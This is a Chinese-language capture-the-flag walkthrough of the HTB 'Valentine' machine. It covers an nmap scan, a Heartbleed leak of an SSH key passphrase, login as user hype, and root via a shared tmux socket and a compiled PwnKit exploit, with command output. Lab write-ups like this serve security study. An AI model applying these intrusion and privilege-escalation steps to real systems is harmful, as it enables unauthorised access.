## nmap

```Bash
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Not valid before: 2018-02-06T00:45:25
|_Not valid after:  2019-02-06T00:45:25
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_ssl-date: 2023-01-09T11:13:29+00:00; 0s from scanner time.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```



## ssh

ssh的版本很低

searchexploit 没有匹配版本



## http

80和443展示同一张图片，下载下来分析了下没有什么特别的，所有的80页面都会重定向到443

目录爆破拿到的目录是用80爆的，但是打开也是自动跳转443

拿到一个有用的目录 /dev可以直接访问，两个文件看一下

![](https://secure2.wostatic.cn/static/dvb1KZ6MV4LWN9j6DYdCyZ/image.png?auth_key=1677500466-oeAaQ1YkW9kP526i3siHCa-0-0e135541dd425fd3214c34edf410a7c4)

![](https://secure2.wostatic.cn/static/pMVC9woso1mdqHpuBeJbw6/image.png?auth_key=1677500466-8acBXMLJ4i3m1gtirfsE2D-0-3ee52a1644b85b519e7943d9febd4bea)

hype_key下载下来，是一个ascii字符文件，不过是16进制编码的，看开头的编码明显是- - - - - BEGIN 明显是一个ssh的KEY文件

![](https://secure2.wostatic.cn/static/fST88KjyCypNBDDVeVo9ZG/image.png?auth_key=1677500466-tLCM77SrysBiCXonu6XUmx-0-2f907b89db165ac9fc5e8c5d2d34d0cb)

尝试解码

```Bash
# 把所有的空格去掉 
sed -i 's/ //g'  hype_key.copy

```

这里去空格操作是多余的，不需要

把拿到的16进制字符串去 https://www.rapidtables.com/convert/number/index.html 做下解码，得到rsa文件



图片暗示有心脏滴血漏洞，直接找poc看一下，拿到一段b64编码

![](https://secure2.wostatic.cn/static/d5LNDaj4ThAw5uVc4zyMMx/image.png?auth_key=1677500466-75srQaM4KFCsWwXxqzWsD1-0-fc3a97fd861307499e3e42652aac985a)



解码后得到一段提示，hype像是一个用户名，被主机信任，那么hype_key应该就是秘钥了

```Bash
┌──(root㉿walle)-[/home/machines/linux/valentine]
└─# echo "aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==" | base64 -d
heartbleedbelievethehype

```

使用用户hype和上面的rsa私钥登录，需要输入key，也就是我们得到的这段话，拿到hype的shell

![](https://secure2.wostatic.cn/static/coRnEb8cpmrYKcCPBiocze/image.png?auth_key=1677500466-n9M8YPb5bVzVSwwVFshwRF-0-4c5a59f24a30f4a0519968a0914910a7)



## privilege escalation

手动搜了下没有发现有用的，直接上LinEnum.sh

没有发现corn

### tumx

session提权参考这篇，讲的非常全面

[Linux Privilege Escalation - Exploiting Shell Sessions - StefLan's Security Blog (steflan-security.com)](https://steflan-security.com/linux-privilege-escalation-exploiting-shell-sessions/)

发现 root 在运行 tmux

```Bash
hype@Valentine:/dev/shm$ cat lin.txt   | grep tmux
/usr/bin/tmux
root        999  0.0  0.1  26416  1668 ?        Ss   03:02   0:01 /usr/bin/tmux -S /.devs/dev_sess

```

```Bash
# 这个scoket文件的group还贴心的给了hype
hype@Valentine:/.devs$ ls -lh dev_sess
srw-rw---- 1 root hype 0 Jan  9 03:02 dev_sess

# 通过socket拿到root
hype@Valentine:/.devs$ tmux -S dev_sess
[exited]

```



### pkexec - ok

这个机器上自带make，一把过

```Bash
hype@Valentine:/dev/shm$ cd PwnKit-Exploit/
hype@Valentine:/dev/shm/PwnKit-Exploit$ ls
b64payloadgen.sh  exploit.c  LICENSE  Makefile  pwnkit64decoded.c  README.md
hype@Valentine:/dev/shm/PwnKit-Exploit$ make
cc -Wall    exploit.c   -o exploit
hype@Valentine:/dev/shm/PwnKit-Exploit$ ls
b64payloadgen.sh  exploit  exploit.c  LICENSE  Makefile  pwnkit64decoded.c  README.md
hype@Valentine:/dev/shm/PwnKit-Exploit$ ./exploit
Current User before execute exploit
hacker@victim$whoami: hype
Exploit written by @luijait (0x6c75696a616974)
[+] Enjoy your root if exploit was completed succesfully
root@Valentine:/run/shm/PwnKit-Exploit# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),30(dip),46(plugdev),124(sambashare),1000(hype)
root@Valentine:/run/shm/PwnKit-Exploit#
root@Valentine:/run/shm/PwnKit-Exploit# cat /etc/issue
Ubuntu 12.04 LTS \n \l

```



### 内核漏洞直接提权 — gg

```Bash
root@Valentine:/run/shm/PwnKit-Exploit# cat /etc/issue
Ubuntu 12.04 LTS \n \l

root@Valentine:/run/shm/PwnKit-Exploit# uname -a
Linux Valentine 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux

```



```Bash
# 精确命中内核和版本军，但是跑步起来
└─# searchsploit Ubuntu | grep 12.04 | grep 3.2.0-23
Linux Kernel 3.2.0-23/3.5.0-23 (Ubuntu 12.04/12.04.1/12.04.2 x64) - 'perf_swevent_init' Local Privilege Escalation (3)                                                                                | linux_x86-64/local/33589.c
Linux Kernel < 3.2.0-23 (Ubuntu 12.04 x64) - 'ptrace/sysret' Local Privilege Escalation                                                                                                               | linux_x86-64/local/34134.c

```

